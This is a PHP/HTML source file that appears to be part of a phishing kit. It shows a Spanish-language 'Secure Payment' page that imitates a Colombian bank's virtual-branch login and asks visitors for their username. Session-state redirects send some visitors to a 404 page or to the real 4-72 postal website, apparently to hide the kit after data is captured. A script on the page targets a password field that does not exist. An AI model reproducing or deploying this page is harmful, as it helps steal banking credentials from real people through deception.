<?php
session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  		

    <title>Secure Payment</title>

    <style>

    *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    </style>


</head>
<body style="background-color:#ececec;">

<center><img src="img/verify.png" alt="" srcset="" width="50%">

<br><br>

<img src="img/logo.png" alt="" srcset="" width="50%">


<br><br><a style="font-size:30px;">Ingresa tu usuario</a></center>

<br><div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:white; height:290px; padding:20px; margin:auto;">

<center><a style="font-size:16px; text-align:center;">El usuario es el mismo con el que ingresas a la Sucursal virtual Personas</a><br>

<br><br><input type="text" name="user" id="txtUsuario" placeholder="Usuario" style="border:none; width:90%;height:35px; border-bottom:1px solid #dcdcdc; padding.left:15px;"><br></center>
<br><a style="position:absolute; right:80px;">¿olvidaste tu usuario?</a><br>
<br>
<center><input type="submit" value="Continuar" id="btnUsuario" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;"></center>

</div>


<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				inicio($("#txtUsuario").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>
    
</body>


</html>